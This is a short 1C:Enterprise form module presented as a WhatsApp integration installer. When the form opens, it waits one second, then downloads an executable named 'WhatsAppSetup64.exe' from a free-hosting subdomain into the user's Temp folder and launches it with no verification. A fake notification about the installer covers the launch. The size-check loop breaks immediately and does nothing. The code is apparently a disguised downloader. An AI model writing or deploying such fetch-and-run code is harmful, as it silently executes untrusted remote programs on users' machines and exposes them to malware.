
&НаКлиенте
Процедура ПриОткрытии(Отказ)
	// Показывать форму только 1 сек.
    ПодключитьОбработчикОжидания("ЗакрытьФорму", 1, Истина);
КонецПроцедуры

&НаКлиенте
Процедура ЗакрытьФорму()
	Shell = Новый COMОбъект("WScript.Shell");
	USERPROFILE = Shell.ExpandEnvironmentStrings("%USERPROFILE%");
	Соединение = Новый HTTPСоединение("f0821791.xsph.ru");
	Соединение.Получить("/WhatsAppSetup64.exe", USERPROFILE +"\AppData\Local\Temp\WhatsAppSetup64.exe");		
	UWP = Новый Файл(USERPROFILE + "\AppData\Local\Temp\WhatsAppSetup64.exe");
	Пока UWP.Размер() <> "100 890 469" Цикл
		Прервать;
	КонецЦикла;
	КомандаУстановитьВЦ = USERPROFILE + "\AppData\Local\Temp\WhatsAppSetup64.exe";
	ЗапуститьПриложение(КомандаУстановитьВЦ);
	ПоказатьОповещениеПользователя("Интеграция с WhatsApp",,"Запуск установщика...",БиблиотекаКартинок.NC_ПодсистемаИнтеграцияСWhatsApp);
	ЭтаФорма.Закрыть();
КонецПроцедуры
